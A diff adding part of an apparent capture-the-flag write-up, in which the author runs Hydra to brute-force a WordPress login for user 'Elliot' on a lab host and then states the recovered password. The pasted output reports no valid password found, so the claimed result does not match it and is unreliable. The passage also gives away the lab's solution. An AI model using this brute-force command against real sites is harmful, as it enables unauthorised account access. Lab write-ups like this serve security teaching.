@@ -1434,5 +1434,21 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-25 02:43:
 
 And here we found the username as `Elliot` and then we'll do the same to get the password.
 ```
+┌──(kali㉿kali)-[~]
+└─$ sudo hydra -l Elliot -P fs-list.txt 10.233.56.70 http-post-form  "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username" -t 30
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-25 03:16:48
+[DATA] max 30 tasks per 1 server, overall 30 tasks, 11452 login tries (l:1/p:11452), ~382 tries per task
+[DATA] attacking http-post-form://10.233.56.70:80/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username
+[STATUS] 2682.00 tries/min, 2682 tries in 00:01h, 8770 to do in 00:04h, 30 active
+[STATUS] 2916.33 tries/min, 8749 tries in 00:03h, 2703 to do in 00:01h, 30 active
+1 of 1 target completed, 0 valid password found
+[WARNING] Writing restore file because 1 final worker threads did not complete until end.
+[ERROR] 1 target did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-11-25 03:20:44
 ```
+
+And here I found the credentials as `Elliot : ER28-0652`, then I was able to login into the dashboard of Wordpress.
+
